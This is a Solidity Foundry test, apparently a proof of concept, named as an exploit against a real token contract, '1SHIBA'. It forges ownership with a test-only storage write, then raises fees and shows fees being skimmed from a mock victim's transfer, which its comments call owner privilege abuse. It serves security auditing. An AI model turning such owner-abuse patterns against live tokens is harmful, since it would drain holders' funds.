pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface ONE1SHIBA {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256) external;
    function setLiquidityFeePercent(uint256) external;
    function excludeFromFee(address) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function getCurrentSupply() external view returns (uint256 rSupply, uint256 tSupply);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);
    ONE1SHIBA target;
    IERC20 token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup
        vm.label(TARGET, "1SHIBA");
        vm.label(attacker, "Attacker");

        // Create victim
        address victim = address(0x1337);
        vm.label(victim, "Victim");

        // Get token interface
        token = IERC20(TARGET);
        target = ONE1SHIBA(TARGET);

        // Become owner by overwriting storage slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify ownership
        require(target.owner() == attacker, "Became owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Simpler exploit approach

        // 1. Set fees to 20% each (high but won't underflow)
        vm.prank(attacker);
        target.setTaxFeePercent(20);
        target.setLiquidityFeePercent(20);

        // 2. Exclude attacker from fees
        vm.prank(attacker);
        target.excludeFromFee(attacker);

        // 3. As owner, we should have tokens. Check balance.
        uint256 ownerBalance = token.balanceOf(attacker);
        console.log("Owner balance:", ownerBalance);

        // 4. Transfer some tokens to victim (1% of owner's balance)
        uint256 victimAmount = ownerBalance / 100;
        vm.prank(attacker);
        token.transfer(address(0x1337), victimAmount);

        console.log("Victim balance after transfer:", token.balanceOf(address(0x1337)));

        // 5. Make victim transfer to trigger fee collection
        // Transfer amount that will generate significant fees
        // Use 10% of victim's balance
        uint256 transferAmount = token.balanceOf(address(0x1337)) / 10;

        // Record initial contract balance to see if fees collected
        uint256 initialContractBalance = token.balanceOf(TARGET);

        vm.prank(address(0x1337));
        token.transfer(address(0x9999), transferAmount);

        // Check if contract received fees
        uint256 newContractBalance = token.balanceOf(TARGET);
        console.log("Contract balance before:", initialContractBalance);
        console.log("Contract balance after:", newContractBalance);

        assertGt(newContractBalance, initialContractBalance, "Fees should be collected");

        // The contract should now have tokens that will be converted to LP tokens for owner
        // This demonstrates the owner privilege abuse
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

